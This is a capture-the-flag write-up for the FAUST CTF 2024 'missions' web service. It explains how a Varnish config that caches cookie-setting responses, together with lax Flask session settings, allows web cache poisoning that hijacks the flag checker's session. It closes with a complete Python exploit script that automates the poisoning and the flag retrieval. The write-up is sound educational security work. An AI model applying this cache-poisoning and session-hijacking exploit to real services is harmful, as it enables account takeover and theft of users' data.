---
title: "missions - FAUST CTF 2024"
category: "web"
subcategory: "http"
type: "writeup"
tags: ["web", "python", "flask-session", "cache-poisoning", "session-hijacking", "flask", "redis", "http", "faust-ctf", "faust-ctf-2024", "2024", "ctf-writeup"]
summary: "The service consists of mainly three parts: a frontend, a backend and a caching proxy."
source:
  name: "CTFtime writeup #39632"
  url: "https://ctftime.org/writeup/39632"
original_source: "https://ctf.sinitax.com/faust24-missions.html"
ctf:
  name: "FAUST CTF 2024"
  year: 2024
  challenge: "missions"
---

## Metadata

- **CTF:** FAUST CTF 2024
- **Task:** missions
- **Author team:** TeamGeramy
- **CTFtime tags:** python, flask-session, cache-poisoning, session-hijacking
- **CTFtime:** <https://ctftime.org/writeup/39632>
- **Original writeup:** <https://ctf.sinitax.com/faust24-missions.html>

---
The service consists of mainly three parts: a frontend, a backend and a caching proxy.

For the **caching proxy**, `varnish` 7.5.0 is used. The proxy's configuration in `files/v.vcl` describes what types of requests will be serviced normally (`return (pipe)` / `return (pass)`) and what types of requests will be cached (`return (hash)`). Specifically, the request url and `Host` header (or destination ip if the `Host` header is not present) are used as the lookup key for cached responses (described in `sub vcl_hash`). Since the use of caching proxies in CTFs is unusual, it's worth taking a look at exactly what kind of requests are cached and how these might be used to trick the flag checker. Here we find that only `GET` and `HEAD` requests whose urls include `/imgs` are cached. *Curiously*, the line preventing responses which set cookies to be cached is commented out:

```  
sub vcl_backend_response {  
unset beresp.http.Vary;  
if (bereq.uncacheable) {  
return (deliver);  
} else if (beresp.ttl <= 0s ||  
/*beresp.http.Set-Cookie ||*/ <\----------  
beresp.http.Surrogate-control ~ "(?i)no-store" ||  
/*(!beresp.http.Surrogate-Control &&  
beresp.http.Cache-Control ~ "(?i:no-cache|no-store|private)") ||*/  
beresp.http.Vary == "*") {  
set beresp.ttl = 360s;  
set beresp.uncacheable = true;  
}  
return (deliver);  
}  
```

The **frontend** is written in typescript and uses the `Vue.js` framework. The route definitions can be found in the `src/pages` directory, each of which renders a page and includes some javascript to communicate with the backend api which is exposed through the caching proxy at `/api`. The following routes are available: `/Mission`, `/MissionLogin` and `/MissionCreate`. Since the frontend simply translates user navigation to the appropriate backend calls, there isn't much to cover here.

The **backend** is written python as a single-file `Flask` app, `[app.py](http://app.py)`. It allows creating a mission via `/api/create` which requires a name and a description and returns a secret. This secret is required to authenticate to a mission via `/api/authenticate` and edit and view the mission data via `/api/add_data` and `api/get_data`, where the flag is stored (in the flask session instead of the postgres database for some reason). The backend also allows retrieving all mission names and infos via `/api/missions` and a specific mission's info via `/api/missioninfo/<mission>`, Here we again encounter suspicious deviations from defaults, this time concerning flask's session management, suggesting that hijacking the flag checker's session is a likely exploit path:

```python3  
login_manager = LoginManager()  
login_manager.init_app(app)  
login_manager.session_protection = None

@app.before_request  
def make_session_permanent():  
session.permanent = True  
```

Eventually we discover that for mission names that begin with `imgs`, requests to `/api/missioninfo/<mission>` expand to `/api/missioninfo/imgs..`, which will include `/imgs` and have their response cached by `varnish`. Thus, **we are able to poison the service response to the missioninfo endpoint with data related to a session we control**. By observing service traffic in tulip, we find that the flag checker requests missioninfo from each mission before setting its mission data to the flag. We can take advantage of this, since when the flag checker requests our mission info via `/api/missioninfo/<mission>`, it will be fed our session cookie, and subsequently set the flag as our mission's data instead!

Full ataka exploit (uses separate redis instance to persist session data across ticks):  
```python3  
#!/usr/bin/env python3

import json, os, random, string, redis, requests

def gen_random(n):  
return "".join(  
random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(n)  
)

HOST = os.getenv("TARGET_IP")  
HOST = f"[{HOST}]:9090"  
EXTRA = json.loads(os.getenv("TARGET_EXTRA", "[]"))  
headers = {"Host": HOST}

# get flags from previous round  
db = redis.Redis(host="172.17.0.1", port=30001, db=0)  
saved = db.get(f"missions-{HOST}")  
if saved is not None:  
name, secret = saved.decode().split(",", 1)  
session = requests.Session()  
r = [session.post](http://session.post)(  
f"http://{HOST}/api/authenticate", json={"mission": name, "secret": secret}  
)  
r = [session.post](http://session.post)(f"http://{HOST}/api/get_data", json={"secret": secret})  
print(r.json()["data"])  
session.close()

# submit new flags  
name = "imgs" + gen_random(10)  
data = {"name": name, "short": "Nothing to see here"}  
session = requests.Session()  
r = [session.post](http://session.post)(f"http://{HOST}/api/create", json=data, headers=headers)  
try:  
secret = r.json()["secret"]  
except requests.JSONDecodeError:  
exit()  
r = session.get(f"http://{HOST}/api/missioninfo/{name}", headers=headers)  
db.set(f"missions-{HOST}", ",".join((name, secret)))  
```
